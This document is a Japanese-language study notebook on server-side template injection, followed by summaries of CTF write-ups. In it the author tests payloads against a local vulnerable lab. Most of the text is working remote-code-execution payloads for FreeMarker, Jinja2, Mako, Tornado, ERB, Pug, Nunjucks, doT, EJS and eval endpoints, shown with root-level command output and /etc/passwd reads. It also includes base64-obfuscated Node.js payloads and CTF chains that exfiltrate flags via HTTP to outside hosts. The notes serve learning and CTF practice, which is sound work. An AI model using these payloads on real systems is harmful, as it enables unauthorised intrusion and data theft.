0b768b56-f00c-49c8-930c-dd94878137f9aaaa{*comment*}bbba1fd270b-cdf0-451d-a1b2-e7bcc8e95395

http://192.168.99.100:15003/freemarker?inj=${%22z%22.join(%22ab%22)}
何も返ってこない
```
`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`以下でRCE！   
```txt
http://192.168.99.100:15003/freemarker?inj=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22id%22%29+%7D
e364a20a-dc6a-4ffe-9c3a-3a160d2f1a87 uid=0(root) gid=0(root) groups=0(root) 7820f0ba-f134-4991-bc75-2ad40f687839
```
### python
#### eval
```python
@app.route("/reflect/<engine>")
def reflect(engine):

    template = request.values.get('tpl')
    if not template:
        template = '%s'

    injection = request.values.get('inj')

    if engine == 'mako':
        return randomword() + MakoTemplates(template % injection, lookup=mylookup).render() + randomword()
    elif engine == 'jinja2':
        return randomword() + Jinja2Env.from_string(template % injection).render() + randomword()
    elif engine == 'eval':
        return randomword() + str(eval(template % injection)) + randomword()
    elif engine == 'tornado':
        return randomword() + tornado.template.Template(template % injection).generate() + randomword()
```
ここらへんはダメ。まあテンプレートエンジンで解析してるわけじゃないから当たり前だけど。   
```txt
http://192.168.99.100:15001/reflect/eval?inj=*
Internal Server Error

http://192.168.99.100:15001/reflect/eval?inj='***'
wkntaemr***sbfrnopf

http://192.168.99.100:15001/reflect/eval?inj=${7*7}
Internal Server Error

http://192.168.99.100:15001/reflect/eval?inj={{7*7}}
Internal Server Error
```
以下でRCEできる！参考は以下。まだ動くPayloadありそう？   
https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html   
```txt
http://192.168.99.100:15001/reflect/eval?inj=__import__(%27os%27).popen(%27id%27).read()
cezfkidwuid=0(root) gid=0(root) groups=0(root) govhugaq
```
#### mako
```python
    if engine == 'mako':
        return randomword() + MakoTemplates(template % injection, lookup=mylookup).render() + randomword()
```
以下より、Makoだと判定できる。   
```txt
http://192.168.99.100:15001/reflect/mako?inj=*
dfgmhedp*gtvdwfrn

http://192.168.99.100:15001/reflect/mako?inj=${7*7}
ezzrutbb49gjbioohx

http://192.168.99.100:15001/reflect/mako?inj=aaa{*comment*}bbb
zhkcggiiaaa{*comment*}bbbagrgkbii

http://192.168.99.100:15001/reflect/mako?inj=${%22*%22.join(%22___%22)}
nyagqhvz_*_*_cahscroa
```
RCEするには以下があるらしいが、これ無理では？   
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
以下とかで`${engine}`で`engine`変数の値が読めるかと思ったけどだめっぽい？   
```txt
http://192.168.99.100:15001/reflect/mako?inj={{%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
pueqjbpv{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}zqhejroz

http://192.168.99.100:15001/reflect/mako?inj=${engine}
Internal Server Error
```
以下でRCEできた！   
```txt
/reflect/mako?inj=${__import__(%22subprocess%22).check_output(%22id%22)}
gwxcpnysuid=0(root) gid=0(root) groups=0(root) sfondqyc
```
#### jinja2
```python
    elif engine == 'jinja2':
        return randomword() + Jinja2Env.from_string(template % injection).render() + randomword()
```
以下でJinja2と判定できる。   
```txt
http://192.168.99.100:15001/reflect/jinja2?inj=*
hzdrchlb*jbjleazb

http://192.168.99.100:15001/reflect/jinja2?inj=${7*7}
pirsuits${7*7}uxbbvhtz

http://192.168.99.100:15001/reflect/jinja2?inj={{7*7}}
cylhjspv49luxnnntk

http://192.168.99.100:15001/reflect/jinja2?inj={{7*%277%27}}
bvsjkzpq7777777bqoqcsnp
```
以下にいろいろ手法が書いてるけどなんかよくわからん…。   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2   
大抵はInternal server errorになったけど以下だけは動いた   
```txt
http://192.168.99.100:15001/reflect/jinja2?inj={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
kumvedgwroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync......
```
以下でRCEできた！   
```txt
/reflect/jinja2?inj={{"".__class__.__mro__[2].__subclasses__()[59].__repr__.__globals__.items()[13][1]["__import__"]("subprocess").check_output("id")}}
egaepbsquid=0(root) gid=0(root) groups=0(root) ipsfpzzk
```
#### tornado
```python
    elif engine == 'tornado':
        return randomword() + tornado.template.Template(template % injection).generate() + randomword()
```
以下より、Jinja2と同じ感じに判定されてる？   
```txt
http://192.168.99.100:15001/reflect/tornado?inj=*
fplhzbeq*qtimtyxd

http://192.168.99.100:15001/reflect/tornado?inj=${7*7}
rccnmdzh${7*7}nxqxuufh

http://192.168.99.100:15001/reflect/tornado?inj={{7*7}}
wvsgtaah49oplxnfgy

http://192.168.99.100:15001/reflect/tornado?inj={{7*%277%27}}
sgpjyjjx7777777ozfenemu
```
以下でRCE!   
```txt
http://192.168.99.100:15001/reflect/tornado?inj={%import%20os%}{{os.popen(%22id%22).read()}}
rggolkqtuid=0(root) gid=0(root) groups=0(root) qtrhruyr
```
### Ruby
#### eval
```ruby
require "cuba"
require "cuba/safe"

require 'tilt'
require 'slim'
require 'erb'

Cuba.plugin Cuba::Safe

Cuba.define do
  on get do
    on "reflect/:engine" do |engine|
      # Keep the formatting a-la-python
      on param("inj"), param("tpl", "%s") do |inj, tpl|
        
        tpl = tpl.gsub('%s', inj)
        
        case engine
        when "eval"
          res.write eval(tpl)
        when "slim"

          template = Tilt['slim'].new() {|x| tpl}
          res.write template.render
        when "erb"
          template = Tilt['erb'].new() {|x| tpl}
          res.write template.render
        else
          res.write "#{engine} #{inj} #{tpl}" 
        end
        
      end
    end
```
`http://192.168.99.100:15005/reflect/eval?inj=*`で以下のようなエラー。   
![image](https://user-images.githubusercontent.com/56021519/102784834-44be7580-43e0-11eb-8bdb-fa8be136cf23.png)   
以下でRCEできる！systemを使うと実行自体はできているがTrueが返ってくる。バッククォートで挟めばシェルコマンドを実行できる！   
```txt
http://192.168.99.100:15005/reflect/eval?inj=system(%27id%27)
true

http://192.168.99.100:15005/reflect/eval?inj=`id`
uid=0(root) gid=0(root) groups=0(root) 
```
#### slim
```ruby
        when "slim"

          template = Tilt['slim'].new() {|x| tpl}
          res.write template.render
```
`http://192.168.99.100:15005/reflect/slim?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102785606-97e4f800-43e1-11eb-8732-2edc23383104.png)   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---basic-injections   
以下で空白が返る（応答なし）かエラーが返るかのどっちか。   
応答なしの場合は実行できてるってことか？？   
```txt
http://192.168.99.100:15005/reflect/slim?inj=#{File.open('/etc/passwd').read}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{File.open('/etc/passwd').read} ^ 

http://192.168.99.100:15005/reflect/slim?inj=#{7*7}
空白

http://192.168.99.100:15005/reflect/slim?inj=#{system('cat%20/etc/passwd')}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{system('cat%20/etc/passwd')} ^ 

http://192.168.99.100:15005/reflect/slim?inj=#{ %x|env| }
空白

http://192.168.99.100:15005/reflect/slim?inj=%23{`wget%20http://127.0.0.1:9500`}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 8 #{`wget http://127.0.0.1:9500`} ^ 

http://192.168.99.100:15005/reflect/slim?inj=%23{`id`}
空白

http://192.168.99.100:15005/reflect/slim?inj=%23{Dir.entries(%27/%27)}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{Dir.entries('/')} ^ 
```
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/ruby/Slim/exploit.py   
によれば以下で行けるらしいけどInternal server errorがでてうまく行ってない…   
```python
#this exploit returns true if successful
payload='#{system( "touch attackerFile" )}'
payload='#{%x( ls )}'
```
#### erb
```ruby
        when "erb"
          template = Tilt['erb'].new() {|x| tpl}
          res.write template.render
```
以下でRCEとかできてる！URL encodeしないと`%`とかうまく機能しないのでそこはやる。   
```txt
http://192.168.99.100:15005/reflect/erb?inj=<%= 7 * 7 %>
49

http://192.168.99.100:15005/reflect/erb?inj=<%= File.open('/etc/passwd').read %>
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync 

http://192.168.99.100:15005/reflect/erb?inj=<%= `id` %>
uid=0(root) gid=0(root) groups=0(root) 
```
### Node.js
#### jade (pug)
```js
var connect = require('connect');
var http = require('http');
var url = require('url');
var pug = require('pug');
var nunjucks = require('nunjucks');
var dust = require('dustjs-linkedin');
var dusthelpers = require('dustjs-helpers');
var randomstring = require("randomstring");
var doT=require('dot');
var marko=require('marko');
var ejs=require('ejs');

var app = connect();

// Pug
app.use('/pug', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query && url_parts.query.tpl != '') {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + pug.render(tpl) + randomstring.generate());
  }
});
```
`http://192.168.99.100:15004/pug?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102789503-974f6000-43e7-11eb-975f-4e6a907eaa26.png)   
以下でRCE！   
```txt
http://192.168.99.100:15004/pug?inj=%23{root.process.exec(%27id%27)}
TypeError: root.process.exec is not a function on line 1

http://192.168.99.100:15004/pug?inj=%23{root.process.mainModule.require(%27child_process%27).spawnSync(%27cat%27,%20[%27/etc/passwd%27]).stdout}
DWaaj1zol8AOye03vUgKQe45bjwYIJPp<root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

http://192.168.99.100:15004/pug?inj=%23{root.process.mainModule.require(%27child_process%27).spawnSync(%27id%27).stdout}
f57THclTZCppfq15t6gWfVgGe7rgq4CJ<uid=0(root) gid=0(root) groups=0(root)
></uid=0(root) gid=0(root) groups=0(root)
>6O6QVxEh23H9q3McNQDhzd0hqOWBIVq9
```
#### nunjucks
```js
// Nunjucks
app.use('/nunjucks', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + nunjucks.renderString(tpl) + randomstring.generate());
  }
});
```
よくわからん。   
```txt
http://192.168.99.100:15004/nunjucks?inj=***
TEDkpYm4gpNPPsw3mspMMDxnAMePvcSD***oPMmVEt3Hhwv7cz30d8cpdXdhrvdMD4o
```
以下のpython2スクリプトで`id`コマンドを実行できるRCE！   
```python
import base64

command_to_execute = "id"
code_to_execute = "global.process.mainModule.require('child_process').execSync('%s').toString()"%command_to_execute
code_b64_Encoded =base64.b64encode( code_to_execute )
jscode = '''range.constructor("return eval(Buffer('%s','base64').toString())")()'''%code_b64_Encoded
payload ='''{{%s}}'''%jscode

# /nunjucks?inj={{range.constructor("return eval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkJykudG9TdHJpbmcoKQ==','base64').toString())")()}}
# kktOA7zUUCZz6Jhf7k8abZ0kC6sGTXwpuid=0(root) gid=0(root) groups=0(root)
# E90XejidKrwlbKKmNTWVQV4Zb2RvNpmK
```
以下でも可！   
```python
jscode = "global.process.mainModule.require('child_process').execSync('ls').toString()"
#jscode = "require('child_process').execSync('ls').toString()" dont have require
#jscode = "require('child_process')"
#jscode = "1+1"
payload ='''{{range.constructor("return eval(\\"%s\\")")()}}'''%jscode

# /nunjucks?inj={{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('id').toString()\")")()}}
# WWKzsJvlaipkYpcwCFOPawDLcHtpcAhIuid=0(root) gid=0(root) groups=0(root)
# xgstTXsVI3B8BeMdhG6oSb6cCozyD7UQ
```
#### javascript (eval)
```js
// Javascript
app.use('/javascript', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + String(eval(tpl)) + randomstring.generate());
  }
});
```
https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44   
以下でファイル読んだりできる。   
```txt
http://192.168.99.100:15004/javascript?inj=require(%27fs%27).readdirSync(%27.%27).toString()
yPCpFdo60IRcRMGyG4evWdBRNWscMz09IkeFEEpcBIQEAREtFRPh9scGWd9pZjIV.js,connect-app.js,node_modules,package-lock.jsonp4KOTBIQhUrikadU5qAuPCq9f28WCiiI

http://192.168.99.100:15004/javascript?inj=require(%27fs%27).readdirSync(%27..%27).toString()
IXjrDkxpfDjDXkFGHJuZXuCR7mqMexcJbasetest.py,env_java_tests,env_node_tests,env_php_tests,env_py_tests,env_ruby_tests,run_channel_test.sh,run_java_tests.sh,run_node_tests.sh,run_php_tests.sh,run_python2_tests.sh,run_python3_tests.sh,run_ruby_tests.sh,test_channel.py,test_java_freemarker.py,test_java_velocity.py,test_node_dot.py,test_node_dust.py,test_node_ejs.py,test_node_javascript.py,test_node_marko.py,test_node_nunjucks.py,test_node_pug.py,test_php_php.py,test_php_smarty_secured.py,test_php_smarty_unsecured.py,test_php_twig_secured.py,test_php_twig_unsecured.py,test_py_jinja2.py,test_py_mako.py,test_py_python.py,test_py_tornado.py,test_ruby_erb.py,test_ruby_ruby.py,test_ruby_slim.py,tests.shR9nOTptanlyTaBR5wlBbENbc9mL6tRqP

http://192.168.99.100:15004/javascript?inj=require(%22fs%22).readFileSync(%22/etc/passwd%22).toString(%27utf8%27)
GNTXzKNvUVwjiltuHC2s9cfzcJUhKWOEroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```
以下でRCEできるはずだけどなんかできてない…。   
```txt
http://192.168.99.100:15004/javascript?inj=require(%22child_process%22).exec(%27id%27)
7c7WZtoA2NYGyIAqsIIpOkYAxk59tdvD[object Object]sTfcMuWmXVA1Sq0RRbh9SQ8R3VpETd8C

require('child_process').exec('wget http://localhost:9500/id=`id`');

WSL上で
>eval("require('child_process').exec('wget http://localhost:9500/id=`id`');")
をやると行けるのに…。
127.0.0.1 - - [22/Dec/2020 00:20:24] "GET /id=uid=1000(tomoki) HTTP/1.1" 404 -
```
以下のpython2スクリプトでRCEできた！   
```python
import base64

command_to_execute = "id"
code_to_execute = "global.process.mainModule.require('child_process').execSync('%s').toString()"%command_to_execute
code_b64_Encoded =base64.b64encode( code_to_execute )
payload = '''eval(Buffer('%s','base64').toString())'''%code_b64_Encoded
```
```txt
/javascript?inj=eval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkJykudG9TdHJpbmcoKQ==','base64').toString())
1UMjgHZPMVKuxrMOLMQZ78CAe7aTqj6Kuid=0(root) gid=0(root) groups=0(root)
SN12DSCs8CE0ixZQJh0U5KBjBF3bQSlX
```
#### dot
```js
// doT
app.use('/dot', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + doT.template(tpl)({}) + randomstring.generate());
  }
});
```
わからん.   
以下でRCE可能！   
```txt
/dot?inj={{=%20global.process.mainModule.require(%27child_process%27).execSync(%27id%27).toString()%20}}
I59SiTdZt2tUfmpgRNTzp18Z3sOv5yUzuid=0(root) gid=0(root) groups=0(root)
yiTceAbMxwuVYlveU6jqsV3kiwiqIIq2
```
#### dust
```js
// Dust
app.use('/dust', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    
    console.log('PAYLOAD: ' + tpl);
    dust.debugLevel = "DEBUG"
    output = '';
    var compiled = dust.compile(tpl, "compiled");
    dust.loadSource(compiled);
    dust.render("compiled", {}, function(err, outp) { output = outp })
    res.end(randomstring.generate() + output + randomstring.generate());
  }
});
```
わからん   
```txt
http://192.168.99.100:15004/dot?inj={{aaa}}
ReferenceError: aaaout is not defined
    at eval (eval at doT.template (/apps/tests/env_node_tests/node_modules/dot/doT.js:133:11), <anonymous>:3:12)
    at /apps/tests/env_node_tests/connect-app.js:191:56
    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
```
ifヘルパーのevalインジェクションのやつ。dust-jsのバージョンによって動く。今回は動いてなさげ？？      
```txt
/dot?inj={@if cond="eval(Buffer('global.process.mainModule.require('child_process').execSync(Buffer('aWQ=', 'base64').toString()', 'base64').toString())"}{/if}
ie15G7raBJOyjxAkv6KIrkx7OcLa5POx{@if cond="eval(Buffer('global.process.mainModule.require('child_process').execSync(Buffer('aWQ=', 'base64').toString()', 'base64').toString())"}{/if}JigcTwTBHoPSNxnugLJ79BMgruhMLUQt
```
#### marko
```js
// Marko
app.use('/marko', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + marko.load(randomstring.generate(), tpl).renderSync() + randomstring.generate());
  }
});
```
わからん   
```txt
http://192.168.99.100:15004/marko?inj=*
SYRmrHgSweRm0BaVwR4d3xyXt6bi49qC<*></*>VtwiRsEOPnAdfCnUWqlIhTzF98oywEfo

http://192.168.99.100:15004/marko?inj={7*7}
Error: An error occurred while trying to compile template at path "/apps/tests/env_node_tests/pSpCYFucRUa3Efxxh7nLJMfNehPbZjLx". Error(s) in template:
1) [pSpCYFucRUa3Efxxh7nLJMfNehPbZjLx:1:0] Unrecognized tag: {7*7} - More details: https://github.com/marko-js/marko/wiki/Error:-Unrecognized-Tag

    at handleErrors (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:93:17)
    at Compiler.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:173:5)
    at _compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:86:31)
    at Object.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:112:10)
    at doLoad (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:162:39)
    at Object.load (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:47:14)
    at /apps/tests/env_node_tests/connect-app.js:228:45
    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
```
以下でRCEできるらしいけどなんかできてない…   
```txt
/marko?inj={{=global.process.mainModule.require('child_process').execSync('ls').toString()}}
Error: An error occurred while trying to compile template at path "/apps/tests/env_node_tests/Kh7NMWMQUQfgSl1VCpNe0qWLoCQoRBl5". Error(s) in template:
1) [Kh7NMWMQUQfgSl1VCpNe0qWLoCQoRBl5:1:0] Unrecognized tag: {{=global.process.mainModule.require('child_process').execSync('ls').toString()}} - More details: https://github.com/marko-js/marko/wiki/Error:-Unrecognized-Tag

    at handleErrors (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:93:17)
    at Compiler.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:173:5)
    at _compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:86:31)
    at Object.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:112:10)
    at doLoad (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:162:39)
    at Object.load (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:47:14)
    at /apps/tests/env_node_tests/connect-app.js:228:45
    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
```
#### ejs
```js
// EJS
app.use('/ejs', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + ejs.render(tpl) + randomstring.generate());
  }
});
```
https://www.hamayanhamayan.com/entry/2020/09/10/222147   
以下でRCEできた！   
```txt
http://192.168.99.100:15004/ejs?inj=***
f6x9fguWEC8K9UZBUrlMVjA7Rx4K1zxc***k4R2SGjAV3g07QZ9eVHYyTMUpte0LGyS

http://192.168.99.100:15004/ejs?inj=<%- global.process.mainModule.require('child_process').execSync('id') %>
ugOlkb8cWen3RKy5jmT3DZoF7bWwJ5Oauid=0(root) gid=0(root) groups=0(root)
UqfIaDZlPpRDsVBvEz04ssis4YEBwPkl
```
# writeup
## jinja2 render_template_string (ISC BugHunt101 CTF 2020)
https://caya8.hatenablog.com/entry/2020/07/16/083000   
- **entrypoint**    
Flaskのencode,decodeをするWebページがある。encode,decodeにはPOSTで`mode=encode`みたいに指定するが、encodeもdecodeも指定しない場合はエラーページを入力を含めて返す。ここのJinja2の`render_template_string`にSSTIがある。   
- **概要**    
以下の場所にSSTIできる！エラーを発生させて、その内容をSSTIするてきな？   
```python
if mode not in ['encode', 'decode']:
    abort(500, description=f'invalid mode ({mode=}) specified')
    
@app.errorhandler(500)
def internal_server_error(e):
    mascot = random.choice(list('🐌🐛🦟🐜🐝🐞🦂🦗🦋🕷'))  # just choose a mascot
    return render_template_string(f'{mascot} < {e.description}'), 500
```
- **Payload**    
`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`とかでRCEできるらしい！今回は同じ`render_template_string`を使っているwebsitesVulnerableToSSTIの以下の`python-jinja2`のやつを使った。   
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/python/python-jinja2/src/server.py   
以下でDocker環境を構築。   
```txt
tomok@LAPTOP-KSRL4PAP MINGW64 ~/docker_work/websitesVulnerableToSSTI/python/python-jinja2 (master)
$ bash runInDocker.sh 0.0.0.0
```
`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`でいけた！   
![image](https://user-images.githubusercontent.com/56021519/102914001-fc2bb880-44c2-11eb-8303-5cd2b4ca0641.png)   
`<pre>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}<!--`として`<pre>`を先頭につけて、末尾に`<!--`を付けると出力が綺麗になる。   
![image](https://user-images.githubusercontent.com/56021519/102914209-46149e80-44c3-11eb-892b-36ef254f6cff.png)   
## erb / bypass 正規表現 "^" "$" (harkaze 解説記事 2017)
https://st98.github.io/diary/posts/2017-12-08-harekaze-ssti-problem.html   
- **entrypoint**    
`params[:memo]`の値が`erb`のテンプレートエンジンに入力されてる。Rubyで入力を`/^[0-9A-Za-z]+$/`で正規表現で数字とアルファベットだけに制限してるが、Rubyでの`^`,`$`は脆弱だから使わない方がいい。これは改行文字を入れることで簡単にBypassできるのでここがentrypoint   
- **概要**    
ソースは以下の通り。   
```rb
def is_valid(s)
  return /^[0-9A-Za-z]+$/ =~ s
end

post '/add' do
  unless session[:memos]
    session[:memos] = []
  end
  unless is_valid(params[:memo])
    redirect to('/')
  end
  session[:memos].push params[:memo]
  // ここが脆弱！
  logger.info erb("memo ('#{params[:memo]}') added", :layout => false)
  redirect to('/')
end
```
Rubyの正規表現の危険性は以下を参照。   
https://blog.tokumaru.org/2014/03/z.html   
`memo=1%0Apwned!`みたいにすると以下のようになり、`!`を挿入できる！   
```txt
memo=1
pwned!
```
- **Payload**    
`require 'net/http'; Net::HTTP.get_print 'example.com', File.read('flag'), 8000`でFlagの中身を表示できるらしい。   
```txt
curl -v http://192.168.99.100:4567/add -d "memo=1%0A%3C%25%3D%20require%20'net%2Fhttp'%3B%20Net%3A%3AHTTP.get_print%20'example.com'%2C%20File.read('flag')%2C%208000%20%25%3E"
```
他にも、``<% abort `cat flag` %>``としてabortに引数として文字列を与えると、それをエラーメッセージとして表示するらしい。   
また、``<% session[:memos].push `cat flag` %>``でセッションにflagを保存することもできるらしい。   
## jinja2 RCE through __class__.__mro__ (BSidesSF CTF 2017)
https://jtwp470.hatenablog.jp/entry/2017/02/15/002304#Zumbo-3-250-pt   
- **entrypoint**    
FlaskのJinja2のtemplate変数に`{{  }}`を挿入できるので脆弱！   
- **概要**    
以下が脆弱な箇所。   
```python
template += "\n<!-- page: %s, src: %s -->\n" % (page, __file__)
```
jinja2のRCEには以下が参考。   
http://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/   
https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/   
- **Payload**    
```txt
// これでWebshell的なものをサーバー上に用意する
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/mocho.cfg', 'w').write('from subprocess import check_output;RUNCMD = check_output') }}

// これで任意コマンドを送信したら実行できる
{{ config['RUNCMD']('/usr/bin/curl http://vault:8080/flag',shell=True) }}
```
## Django str.format Information Disclosure (CODEGRAY CTF 2018)
https://blog.ssrf.in/post/codegray-ctf-writeup/   
- **entrypoint**    
python2.6以降で`format`関数の`"hello {user}".format(user="John")`みたいなのの`"hello {user}"`に該当する箇所をユーザーの入力にできる部分が脆弱！これでグローバル変数の値を読みだせる！   
- **概要**    
以下のソースの`template.format(email=email,user=user)`で`template`にユーザーの入力を挿入できる部分が脆弱！   
```python
# Create your views here.
def main(request):
    context = {}
    return render(request, 'mypage/index.html', context)

def subscribe(request):
    # Get parameter from user
    email = request.POST['email']; ... 👈
    user = request.user
    # Building json
    template = '%s' % email
    template = template.format(email=email, user=user)
    template = "{'result':true, 'email':'"+template+"'}"
```
python3のformatに関する参考は以下。   
https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/   
https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/   
以下のように`.format`の左側のやつを指定できるとき、以下の手法でグローバル変数にアクセスできる！   
```python
CONFIG = { 
    "KEY": "ASXFYFGK78989"
} 
  
class PeopleInfo: 
    def __init__(self, fname, lname): 
        self.fname = fname 
        self.lname = lname 
  
def get_name_for_avatar(avatar_str, people_obj): 
    return avatar_str.format(people_obj = people_obj) 
    
people = PeopleInfo('GEEKS', 'FORGEEKS') 
  
st = "Avatar_{people_obj.fname}_{people_obj.lname}"
print(get_name_for_avatar(st, people_obj = people) )
# Avatar_GEEKS_FORGEEKS

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
print(get_name_for_avatar(st, people_obj = people) )
# ASXFYFGK78989
```
- **Payload**    
```txt
{email}{user.set_password.__globals__[auth].admin.settings.SECRET_FLAG}

// 以下のように返ってくるらしい
{'result':true, 'email':'{email}{user.set_password.__globals__[auth].admin.settings.SECRET_FLAG}FLAG{IU_Is_the_b3st_singer_ev3r!}'}
```

## jinja2 / LFI / session['']に暗号化鍵で暗号化した値をセット (ASIS_CTF 2017 Golem)
https://github.com/bl4de/ctf/blob/master/2017/ASIS_CTF_2017/Golem/Golem_Web_writeup.md   
- **entrypoint**    
LFIができることがまずわかっていて、そこから`../../../proc/self/cmdline`で現在のプロセスを実行するために使われたコマンドを特定して、そこから`.ini`ファイルが見つかってその`.ini`ファイルを読むとWebのserver.pyのフルパスがわかってそれをLFIする。   
`render_template_string`にユーザーの入力が入るのでSSTI可能！   
- **概要**    
`session['golem']`の値がセットされていないければ`session['golem']`に`GET ?golem=`の値をセットしてそれが`template`変数に入る。ここで`GET ?golem=`の値は`.`,`_`,`{`,`}`がフィルタリングされる。   
`GET ?golem=`の値をセットせず、`session['golem']`の値がセットされていれば、この値をそのまま`template`変数に挿入して、フィルタリングなしでSSTIできる！   
```python
execfile('flag.py')
execfile('key.py')

FLAG = flag
app.secret_key = key


@app.route("/golem", methods=["GET", "POST"])
def golem():
    if request.method != "POST":
        return redirect(url_for("index"))

    golem = request.form.get("golem") or None

    if golem is not None:
        golem = golem.replace(".", "").replace(
            "_", "").replace("{", "").replace("}", "")

    if "golem" not in session or session['golem'] is None:
        session['golem'] = golem

    template = None

    if session['golem'] is not None:
        template = '''{% % extends "layout.html" % %}
		{% % block body % %}
		<h1 > Golem Name < /h1 >
		<div class ="row >
		<div class = "col-md-6 col-md-offset-3 center" >
		Hello: % s, why you don't look at our <a href=' / article?name = article'> article < /a >?
		< / div >
		< / div >
		{% % endblock % %}
		''' % session['golem']

        print

        session['golem'] = None

    return render_template_string(template)
```
